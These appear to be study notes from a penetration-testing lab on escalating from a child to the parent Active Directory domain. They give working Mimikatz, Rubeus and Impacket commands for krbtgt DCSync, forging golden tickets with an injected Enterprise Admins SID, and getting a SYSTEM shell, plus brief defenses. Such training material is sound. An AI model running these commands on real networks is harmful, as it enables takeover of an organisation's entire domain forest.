# parent-child

**II. Enumerating Trust Relationships**

**Get-ADTrust (PowerShell):** Enumerates domain trust relationships using built-in tools.

*Commands:*

`Import-Module activedirectory
Get-ADTrust -Filter *`

**PowerView (PowerShell):** Provides functions for enumerating trusts, types, and authentication flow.

*Commands:*

`Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName`

**netdom (Command-line):** Retrieves domain information, including trusts, domain controllers, workstations, and servers.

*Commands:*

`netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation`

**BloodHound:** Visualizes trust relationships using the "Map Domain Trusts" pre-built query.

**I. SID History Primer**

**Purpose:**

- Used in Active Directory migrations to retain access to resources from the original domain after a user is migrated.

**Mechanism:**

- The original user's Security Identifier (SID) is stored in the `sidHistory` attribute of the new account in the target domain.

**Abuse Potential:**

- Attackers can inject privileged SIDs into the `sidHistory` attribute of a compromised account.
- This allows privilege escalation by impersonating high-privilege users or groups.

---

**II. ExtraSIDs Attack - Mimikatz**

**Concept:**

- Exploits the absence of SID filtering within an Active Directory forest to escalate privileges.
- Injects the SID of the **Enterprise Admins** group into a user's `sidHistory` attribute.
- Grants the attacker **Enterprise Admin** privileges within the parent domain.

**Requirements:**

- **KRBTGT** hash of the child domain.
- **SID** of the child domain.
- **Name of a target user** in the child domain (can be nonexistent).
- **FQDN** of the child domain.
- **SID of the Enterprise Admins group** in the parent domain.

**Attack Steps:**

1. **Obtain KRBTGT hash:**
- `lsadump::dcsync /user:LOGISTICS\krbtgt`
- **Retrieve Child Domain SID:**
- `Get-DomainSID`
- **Retrieve Enterprise Admins SID:**

`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`

OR

- `Get-ADGroup Identity "Enterprise Admins" Server "INLANEFREIGHT.LOCAL"`
- **Execute ExtraSIDs Attack using Mimikatz:**
- `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt`
- **Verify the Ticket:**
- `klist`
- **Access Parent Domain Resources:**
1. `dir \\academyeadc01.inlanefreight.local\c$`

---

**III. ExtraSIDs Attack - Rubeus**

**Concept:**

- An alternative method for executing the ExtraSIDs attack.

**Attack Steps:**

1. **Gather Required Data (Same as Mimikatz).**
2. **Perform ExtraSIDs Attack using Rubeus:**
- `.\Rubeus.exe golden /rc4:<KRBTGT_NT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt`
- **Verify Ticket in Memory:**
- `klist`
- **Perform DCSync Attack or Other Privileged Actions:**
1. `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`

---

**IV. Security Considerations & Defense Strategies**

- **Enable SID Filtering:**
    - Prevents SID injection across trusts.
    - Command:
- 
    - `netdom trust TrustingDomain /domain:TrustedDomain /quarantine:yes`
- **Monitor for Unauthorized SID History Modifications:**
    - Track changes in event logs (`Event ID 4765` & `4766`).
- **Restrict Privileged Group Membership:**
    - Minimize Enterprise Admins and Domain Admins group membership.
- **Implement Tiered Administration Model:**
    - Reduce exposure of high-privilege accounts to compromise.
- **Regularly Audit Trust Relationships:**
    - Identify and remediate unnecessary or insecure trusts.

By understanding and securing against SID History and ExtraSIDs abuse, organizations can reduce the risk of privilege escalation and domain compromise.

# LINUX

**I. Prerequisites**

To perform this attack, the following information is required:

- **KRBTGT hash** for the child domain.
- **SID** for the child domain.
- **Target user name** (can be non-existent).
- **FQDN** of the child domain.
- **SID of the Enterprise Admins group** of the root domain.

---

**II. Steps**

### 

### 1. Obtain KRBTGT hash

Use `secretsdump.py` from Impacket.

**Command:**

`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`

### 

### 2. Obtain SID for child domain

Use `lookupsid.py` from Impacket.

**Commands:**

`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`

Filter to get only the Domain SID:

`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"`

### 

### 3. Obtain SID for Enterprise Admins group

Use `lookupsid.py` targeting the parent domain's DC.

**Command:**

`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`

### 

### 4. Construct Golden Ticket

Use `ticketer.py` from Impacket.

**Command:**

`ticketer.py -nthash <KRBTGT_NT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ENTERPRISE_ADMINS_SID> hacker`

### 

### 5. Set KRB5CCNAME environment variable

**Command:**

`export KRB5CCNAME=hacker.ccache`

### 

### 6. Gain SYSTEM shell on parent domain DC

Use `psexec.py` from Impacket.

**Command:**

`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`

### 

### 7. Automate with raiseChild.py

**Command:**

`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`

---

**III. Important Considerations**

- `raiseChild.py` automates the process, but understanding the manual steps is crucial for troubleshooting.
- Using "autopwn" scripts in client environments requires caution.
- A thorough understanding of the underlying tools is paramount.
- Impacket is a powerful suite of tools that should be used responsibly.